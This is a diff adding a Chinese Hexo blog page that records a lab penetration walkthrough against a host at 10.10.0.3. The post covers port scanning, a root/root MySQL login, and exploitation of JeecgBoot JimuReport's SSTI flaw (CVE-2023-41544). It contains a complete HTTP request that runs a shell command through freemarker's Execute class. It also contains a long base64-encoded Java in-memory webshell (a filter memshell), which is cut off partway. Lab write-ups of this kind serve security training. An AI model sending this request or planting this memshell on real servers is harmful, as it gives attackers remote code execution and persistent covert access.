@@ -1,0 +1,456 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>wuxiang月挑战one | icon'Blog</title><meta name="author" content="icon"><meta name="copyright" content="icon"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="wuxian打靶记录—月挑战入口机器10.10.0.3使用多种扫描工具对其进行端口探测，指纹识别等来进行交叉验证 TscanPlus扫描：扫描结果如下：    ID Host Port Protocol Target Banner Code Title      1 10.10.0.3 22 SSH 10.10.0.3:22 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 0">
+<meta property="og:type" content="article">
+<meta property="og:title" content="wuxiang月挑战one">
+<meta property="og:url" content="https://iconabc.github.io/posts/55d580db.html">
+<meta property="og:site_name" content="icon&#39;Blog">
+<meta property="og:description" content="wuxian打靶记录—月挑战入口机器10.10.0.3使用多种扫描工具对其进行端口探测，指纹识别等来进行交叉验证 TscanPlus扫描：扫描结果如下：    ID Host Port Protocol Target Banner Code Title      1 10.10.0.3 22 SSH 10.10.0.3:22 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 0">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://iconabc.github.io/img/mbc.jpg">
+<meta property="article:published_time" content="2024-12-10T02:49:26.000Z">
+<meta property="article:modified_time" content="2024-12-10T16:16:41.295Z">
+<meta property="article:author" content="icon">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="打靶记录">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://iconabc.github.io/img/mbc.jpg"><link rel="shortcut icon" href="/img/shasha.png"><link rel="canonical" href="https://iconabc.github.io/posts/55d580db.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":150,"languages":{"author":"作者: icon","link":"链接: ","source":"来源: icon'Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'wuxiang月挑战one',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/mbc.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/shuai.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">icon'Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">wuxiang月挑战one</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">wuxiang月挑战one</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-12-10T02:49:26.000Z" title="发表于 2024-12-10 10:49:26">2024-12-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-10T16:16:41.295Z" title="更新于 2024-12-11 00:16:41">2024-12-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/wuxian%E6%89%93%E9%9D%B6%E6%9C%88%E6%8C%91%E6%88%98one/">wuxian打靶月挑战one</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="wuxian打靶记录—月挑战"><a href="#wuxian打靶记录—月挑战" class="headerlink" title="wuxian打靶记录—月挑战"></a>wuxian打靶记录—月挑战</h1><h2 id="入口机器10-10-0-3"><a href="#入口机器10-10-0-3" class="headerlink" title="入口机器10.10.0.3"></a>入口机器<strong>10.10.0.3</strong></h2><p>使用多种扫描工具对其进行端口探测，指纹识别等来进行交叉验证</p>
+<p>TscanPlus扫描：扫描结果如下：</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Host</th>
+<th>Port</th>
+<th>Protocol</th>
+<th>Target</th>
+<th>Banner</th>
+<th>Code</th>
+<th>Title</th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>10.10.0.3</td>
+<td>22</td>
+<td>SSH</td>
+<td>10.10.0.3:22</td>
+<td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.11</td>
+<td>0</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>2</td>
+<td>10.10.0.3</td>
+<td>3306</td>
+<td>MYSQL</td>
+<td>10.10.0.3:3306</td>
+<td>MySQL 8.0.19</td>
+<td>0</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>3</td>
+<td>10.10.0.3</td>
+<td>6379</td>
+<td>REDIS</td>
+<td>10.10.0.3:6379</td>
+<td>Redis key-value store 5.0.14</td>
+<td>0</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>4</td>
+<td>10.10.0.3</td>
+<td>18080</td>
+<td>HTTP</td>
+<td><a target="_blank" rel="noopener" href="http://10.10.0.3:18080/">http://10.10.0.3:18080</a></td>
+<td>APACHE-Shiro</td>
+<td>200</td>
+<td>DocToolkit</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>5</td>
+<td>10.10.0.3</td>
+<td>18088</td>
+<td>HTTP</td>
+<td><a target="_blank" rel="noopener" href="http://10.10.0.3:18088/">http://10.10.0.3:18088</a></td>
+<td>Apache-Tomcat</td>
+<td>404</td>
+<td>HTTP Status 404 – Not Found</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>fscan扫描：结果如下</p>
+
+
+<p>发现了弱口令：再使用tscan爆破模块进行交叉验证</p>
+
+
+<p>确实存在mysql弱口令数据库暴露了出来，将初步收集到的信息进行保存</p>
+<p>对http网站进行目录探测操作：</p>
+<p>这里，可以利用多种爆破工具，在此出于方便，我直接利用tscanplus进行扫描</p>
+<p>探测到如下一些信息：</p>
+<p><code>http://10.10.0.3:18088/</code>：</p>
+
+
+
+
+<p>可以发现一些关于：<code>jeecg-boot</code>的一些信息，在这里打个？后面再对其进行深度分析和挖掘。</p>
+<p><code>http://10.10.0.3:18080/</code>：</p>
+
+
+<p>探测到如上目录：</p>
+
+
+<p>可以发现:<code>DocToolkit</code>依旧打个？后续对其进行深入研究和挖掘</p>
+<hr>
+
+<p><code>mysql</code>弱口令<code>root/root</code>直接利用navicat工具连接：</p>
+<p>依旧发现了<code>jeecg-boot</code>的行踪与上面相呼应。</p>
+
+
+<hr>
+
+<h3 id="积木报表-SSTI："><a href="#积木报表-SSTI：" class="headerlink" title="积木报表 SSTI："></a>积木报表 SSTI：</h3><p><code>http://10.10.0.3:18088/jeecg-boot/</code></p>
+<p>尝试查询相关历史漏洞进行利用：</p>
+<p>直接利用这个One-fox里的jeecg-boot框架相关的工具对其进行漏洞探测</p>
+
+
+<p>直接利用内置的工具进行<code>rce</code>:</p>
+
+
+<p>这个是java的ssti:具体cve漏洞为：<code>CVE-2023-41544</code>手动复现如下</p>
+<p>POC:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /jeecg-boot/jmreport/loadTableData HTTP/1.1</span><br><span class="line">Host: 10.10.0.3:18088</span><br><span class="line">Content-Length: 165</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://10.10.0.3:18088</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://10.10.0.3:18088/jeecg-boot/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;dbSource&quot;:&quot;&quot;,&quot;sql&quot;:&quot;select &#x27;&lt;#assign value=\&quot;freemarker.template.utility.Execute\&quot;?new()&gt;$&#123;value(\&quot;whoami\&quot;)&#125;&#x27;&quot;,&quot;tableName&quot;:&quot;test_demo);&quot;,&quot;pageNo&quot;:1,&quot;pageSize&quot;:10&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>尝试ssti打入内存马：</p>
+<p>直接利用工具<code>java-memshell-generator</code>生成base64编码生成后的内存马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yv66vgAAADEBsgEAK29yZy9hcGFjaGUvY29tbW9ucy9sYW5nL2wvQ29uZmlndXJhdGlvblV0aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQANZ2V0VXJsUGF0dGVybgEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAEQ29kZQEAAi8qCAAIAQAMZ2V0Q2xhc3NOYW1lAQAvY29tLmZhc3RlcnhtbC5qYWNrc29uLlNlcnZsZXRSZXF1ZXN0UGp4dGRGaWx0ZXIIAAsBAA9nZXRCYXNlNjRTdHJpbmcBAApFeGNlcHRpb25zAQATamF2YS9pby9JT0V4Y2VwdGlvbgcADwEAEGphdmEvbGFuZy9TdHJpbmcHABEBCkxINHNJQUFBQUFBQUFBS1ZYQ1hzVDF4VTl6NUk5c2l4Q0VNRllRSUtURkxBczI4S0FDWllKaWVVNHdjUTJGQ1dtanRObExJMHNHWGtrTkNQSG9rdmFkRW02cDAyM2ROOUpkOUlHR1FjQ2RBc05UWnR1N3I5SnY1NDNJOG1TTEJ2NjlmdXNOL1BldSsvY2U4OWQzdmpHZjE2OUFxQVgveFlJUnROendiaHFtRnAyWVM0Vm5GV2pwNDIwSG94bzJmbVVacDdVenVRMHd6d3h1MkRHSGs2bUtLUkFDR3laVmVmVllFclZaNEpES2RVd1J0TnFURzQ1Qk82UVd3dEJ3ejRmTEIxcUZCQXpQTmd4RmZhUDFwd2VFSEFPcFdPYXdNYlJwSzZONSthbXRleGo2blNLSzk3UmRGUk5UYWpacEp3WEY1MW1JbWtJOUk3K2o3WlRrWmdXYUpnS0M3VEV0RGlWV1FZSWJLVmRJeU9yTGZQZ2RteHl3d212UU5QaHBKNDBqd2c0T3Z3VEh0eUJMWEtqVldCYlIrMDVtNDhCL3dRVlJvbSt4cjRFYVpNZzJ3VmNzYlJ0cE1DVWpiZENZclZEQTJ2dEdwbTBibWkxMnpicVVFSk42cFpCbTFkc0dWNklhaGt6bWRZVjdCUlFETTB3T0JGb3I0RkltR1ltZUpSRHhKWWdqNDcwOUt5TWx3V1dNNU9wNEppYTRmcVc0dEZvTnA4eDA4R2haQ1poODY2VjltcFVjKzgybzhvL2didlc5NTk2aldxZkJYYmVoQlFHUEw1Q2hNRDJkVmdpRmRtU0tYdldwcUxHSmxlMmJFeHQvRllmS2x1MTY1YmdGZXdUMkgxcm9Bb09DR3lJbUN3R2hxUllNZTZFSmpOdVhKMnphbW9sRGhFem05Um5tSW4zNFZBekd0QXYwRHlqbVVjdGNlcnNXQzNycjNkOEFJZGJzQi8zazJkYjFZU2F5bWtlUEdERFBpaHdlKzBwQlN4RFZ6U3RteVNkTmJpOXFvd1NhallpbmRlajJvRC9DUThld3JBYlEzaVl2dEMrU0NsVjcrbnczeXhaUFRpS0VXbmNNWUZOSy9sNlZEVVNKRWpCcUJ0amFIV2hoN1JWcGJPQ0UwejBUSTVwY0tqU3R1UFRzMXEwV0laVksvN1ZTeDZjUktRRjc4UmpMdXgxNFc1V1FzNkZkN0dIWmRnSFBIakM1bWVLU2IrK0d3cmVUYlpvakVVc0U3Tk9aT3BZeEViMVhyeXZCZStCU2w4R2h5TXVSSXM5b0taSUZSQzFoZHlPNklhcGtuWUIvNXJScnkxd0QyYVFjQ09PSkV1eFNzRElhRkZXWXpTcm1ZOXErUWhuQ2s3VEV5b0s1MDJOY1hkMitLZkNIc3hCbHdGTzI4MjRqbUtyNTU1eEl3VW1wbFAyWWlrNllrc2FXalNYVFpyNUlKVllvaVp5MHA3NXFzU3pXVkd3WUJ0UWJQNmJPK28xL3JONHZ4dDVmSURkcG1aVHdZZll0RXJuN1Y0dTRGdU5VbTd6SDhaSDNIZ2F6N2daYXZiNkhldTFOd1VmdDJ2d1pMRUd0NVdBaytsZ09CZVBhMWt0WnU4UitWazgxNEpQNEpNQ3JmVmxGSHphNmsxcVRONnR2Sjg3NnRidlovRTVOejZEejlPeFdEcXNHdHJCQXc5cFVldFNicTJYQlRKaVg4QVhwVU12c0YvS3kwdFhVN3drNVFVdk43K01yMGorditxQkFwY1VlNUhacFd0UHJXUlh0U1hsZXZrR3ZpbTUraGF4U0lpYU11UlhRNTNNWmsvNERyNHJRL1E5a3I5bU4xZndBNEVILzc4YlZlYlRuZmhSQzM2SUg3UC9sTzh1bzNTYmt2V1I0eFczNlU5V2xYTVJza0xtWndLTjBaUjY5aXk3VXAwdklpVm0wWit0YnRkRjU1bi84MnEyanhWdG1KUm9OWEo2ejF6U2lQYUVCeVBEcGNobFhmZ05jZUxwWXR2ZmRaTmVYa3I4Q3lqSUFDd0tlR3diN0lSeVljbk95ekhOVEtSalpWS3I4S1pXNFZWcXlHcnhGTTBQMmdoVWRRbVhwYXJYQk5yV2tsSndsWm1RMU9mVHArbERmNTFNbUxyRlJ2eGIvTTZOYS9pOWdvM0ZwdEFqTzMyUG5lMHV2RzVmTFdYeS9rUzlOZ0V1M0dCYnE4MmhZcEtsOVhoeXh2cXk4c1FyVmxqbDY4bGJBV2J3MG5uYTBxdjJ4cUw5dmRIK3ZmZnQzOWNYUGVqQzMyakw0enpZUFRpajZhWUwvNkQ4TVQyZVQ2UlVGLzZGdTFsUFR0QStPRGp5RHVIWHZKQlh1UFY4d0hyeVExMldIc2RtenU2bmZBT2Z6WjBCUitES0lqYWY1NlFCYm81TkZBRmJhd3ZIVmxzSUhtd0FyTGZic0pIN1FuN3VGcUdHS1NOUGJPMWM1TS83OXd0NHN0UDd6d3NJZFhxWEwyRHc1VEt3MndMYlN0QTJDOXhqSHl1Q1M4aTJJdVFKU2tyWnRzN0FJbmJjSEhNN1VYWlVHTnhXTnJnTlBteXpETDRUZDNHUDZPSXlYWlJhbGdQWHNEL2s3THFHdmxDano5bjVDa0pMT05LQTEvRlN4WXd2Z3dVODhpSmVrT0pMZUZRZzFIUUpZNU9MR0E4cFBzVjdQTENFeHgwNHhkY0pYMlA1L1pTdnFmamU1SjBreUpOTG1IYkFHN3VJMlpETDUycThoSlMxWEVER0cxdUVVY0JUbDlBdzJWbkFCd3Y0NkNJKzVuTjFFdmxUQWdVOFg4Q1hDdmhhQVY4djROcytwWUR2bnpxSGx1NUExeExPT1hBT0cwSk5wY25MZE5XRDY3aUJkaWFEcE9nWXZCeDMwdWwyN3R5TElONkJFSGJ4YnQyTmNleGh1blN3TVhmQ1FJQ1hYQmVlUnpjdW93ZFhLWG1kbjBrMytJL2htOWpITkR0Z1VSd25hZ2pQTU9udUllWVFHKzY5UkZSNE5reXlkekhGM3VSdk41R2JKTW5sVUN4VGo5OEsrVEsxQmF4QUxWTmZOKzFzd2x2VUdHUlNldkFHOWxKakl3NXlmeE9jYitPcWd2MEsrcFN3Z3ZabXZHU2xhQU4raXA4VGpIZU9IVlc4emRWR1B2UGVWeTdpNGxpWDkxWG5hM2g2MHVFZGloUndwWXZFY1o2ZmRBUTQvY00xL0xIOGQzN01lNTBueHJ1OWJ6aDRnc0tDenp5bFFrNmZrK0h3L3JrU3llZGNDOGZ5VGRwZVluNmJ4Y0FoanYxY0RaSERBYzRPWTVUbEo1azh3cDBtTXZFTC9KSk9ITUtnOWViZ2ZqZCtoZk5rWXg4ZVlVVDNXRnpseTB6bThXdEtDNHNoVnVzWjhtTFJJbHRBTzM4bUkyQ1QwbWNWQ25OK3BXTHM4ZzVYVklzb0F3djhCWC9sV0FLVERMOVZMdlNBSlZFSGJMaWluTXRnL3dVU015Y1JWUkFBQUE9PQgAEwEABjxpbml0PgEAFShMamF2YS9sYW5nL1N0cmluZzspVgwAFQAWCgASABcBAAMoKVYBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwAaAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAGZmlsdGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAHY29udGV4dAEACGNvbnRleHRzAQAQTGphdmEvdXRpbC9MaXN0OwEABHRoaXMBAC1Mb3JnL2FwYWNoZS9jb21tb25zL2xhbmcvbC9Db25maWd1cmF0aW9uVXRpbDsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQAkTGphdmEvdXRpbC9MaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQAOamF2YS91dGlsL0xpc3QHACcBABJqYXZhL3V0aWwvSXRlcmF0b3IHACkBAA1TdGFja01hcFRhYmxlDAAVABkKAAQALAEACmdldENvbnRleHQBABIoKUxqYXZhL3V0aWwvTGlzdDsMAC4ALwoAAgAwAQAIaXRlcmF0b3IBABYoKUxqYXZhL3V0aWwvSXRlcmF0b3I7DAAyADMLACgANAEAB2hhc05leHQBAAMoKVoMADYANwsAKgA4AQAEbmV4dAEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAA6ADsLACoAPAEACWdldEZpbHRlcgEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAA+AD8KAAIAQAEACWFkZEZpbHRlcgEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgwAQgBDCgACAEQBAARrZXkxAQAIY2hpbGRyZW4BABNMamF2YS91dGlsL0hhc2hNYXA7AQADa2V5AQALY2hpbGRyZW5NYXABAAZ0aHJlYWQBABJMamF2YS9sYW5nL1RocmVhZDsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAHdGhyZWFkcwEAE1tMamF2YS9sYW5nL1RocmVhZDsHAFABABBqYXZhL2xhbmcvVGhyZWFkBwBSAQARamF2YS91dGlsL0hhc2hNYXAHAFQBABNqYXZhL3V0aWwvQXJyYXlMaXN0BwBWCgBXACwBAApnZXRUaHJlYWRzCABZAQAMaW52b2tlTWV0aG9kAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsMAFsAXAoAAgBdAQAHZ2V0TmFtZQwAXwAGCgBTAGABABxDb250YWluZXJCYWNrZ3JvdW5kUHJvY2Vzc29yCABiAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMAGQAZQoAEgBmAQAGdGFyZ2V0CABoAQAFZ2V0RlYMAGoAXAoAAgBrAQAGdGhpcyQwCABtCABHAQAGa2V5U2V0AQARKClMamF2YS91dGlsL1NldDsMAHAAcQoAVQByAQANamF2YS91dGlsL1NldAcAdAsAdQA0AQADZ2V0DAB3AD8KAFUAeAEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwAegB7CgAEAHwBAA9qYXZhL2xhbmcvQ2xhc3MHAH4KAH8AYAEAD1N0YW5kYXJkQ29udGV4dAgAgQEAA2FkZAEAFShMamF2YS9sYW5nL09iamVjdDspWgwAgwCECwAoAIUBABVUb21jYXRFbWJlZGRlZENvbnRleHQIAIcBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7DACJAIoKAFMAiwEACHRvU3RyaW5nDACNAAYKAH8AjgEAGVBhcmFsbGVsV2ViYXBwQ2xhc3NMb2FkZXIIAJABAB9Ub21jYXRFbWJlZGRlZFdlYmFwcENsYXNzTG9hZGVyCACSAQAJcmVzb3VyY2VzCACUCAAgAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24HAJcBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYMABUAmQoAmACaAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24HAJwBAB9qYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uBwCeAQAramF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbgcAoAEACVNpZ25hdHVyZQEAJigpTGphdmEvdXRpbC9MaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQATamF2YS9sYW5nL1Rocm93YWJsZQcApAEACWNsYXp6Qnl0ZQEAAltCAQALZGVmaW5lQ2xhc3MBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABWNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBAAtjbGFzc0xvYWRlcgEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyBwCuAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7DACwALEKAFMAsgEADmdldENsYXNzTG9hZGVyDAC0AIoKAH8AtQwACgAGCgACALcBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7DAC5ALoKAK8AuwwADQAGCgACAL0BAAxkZWNvZGVCYXNlNjQBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCDAC/AMAKAAIAwQEADmd6aXBEZWNvbXByZXNzAQAGKFtCKVtCDADDAMQKAAIAxQgAqAcApwEAEWphdmEvbGFuZy9JbnRlZ2VyBwDJAQAEVFlQRQwAywCrCQDKAMwBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAM4AzwoAfwDQAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kBwDSAQANc2V0QWNjZXNzaWJsZQEABChaKVYMANQA1QoA0wDWAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsMANgA2QoAygDaAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DADcAN0KANMA3gEAC25ld0luc3RhbmNlDADgADsKAH8A4QEADWdldEZpbHRlck5hbWUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEADGxhc3REb3RJbmRleAEAAUkBAAljbGFzc05hbWUBABJMamF2YS9sYW5nL1N0cmluZzsBAAEuCADpAQALbGFzdEluZGV4T2YBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkMAOsA7AoAEgDtAQAJc3Vic3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7DADvAPAKABIA8QEACWZpbHRlckRlZgEACWZpbHRlck1hcAEAAmUyAQAMY29uc3RydWN0b3JzAQAgW0xqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsBAAxmaWx0ZXJDb25maWcBAA1maWx0ZXJDb25maWdzAQAPTGphdmEvdXRpbC9NYXA7AQAOY2F0YWxpbmFMb2FkZXIBAA9maWx0ZXJDbGFzc05hbWUBAApmaWx0ZXJOYW1lAQAjW0xqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjwqPjsHAPcBABFnZXRDYXRhbGluYUxvYWRlcgwB